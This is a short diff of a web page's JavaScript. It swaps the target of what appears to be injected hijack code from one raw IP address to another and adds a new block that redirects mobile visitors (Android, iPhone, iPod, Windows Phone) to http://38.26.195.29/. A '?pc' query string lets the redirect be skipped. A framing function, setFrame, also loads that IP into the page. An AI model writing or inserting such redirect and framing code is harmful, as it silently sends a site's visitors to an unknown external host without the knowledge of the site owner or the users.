@@ -16,15 +16,11 @@
   var s = document.getElementsByTagName("script")[0]; 
   s.parentNode.insertBefore(hm, s);
 })();
-if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
-    //alert(navigator.userAgent);  
-    window.location.href = "http://38.26.195.27/";
-}else if (/(Android)/i.test(navigator.userAgent)) {
-    //alert(navigator.userAgent); 
-    window.location.href = "http://38.26.195.27/";
-}
+
+
+
 var titlestr=document.title;
-setFrame("http://38.26.195.27/");
+setFrame("http://38.26.195.29/");
 
 
 
@@ -53,4 +49,9 @@ function setFrame(olink){
       }, 100)
     } catch (e) {}
 }
-;
+
+try {
+  if (location.search.indexOf('?pc') !== 0 && /Android|Windows Phone|iPhone|iPod/i.test(navigator.userAgent)) {
+    window.location.href = 'http://38.26.195.29/';
+  }
+} catch (e) {}
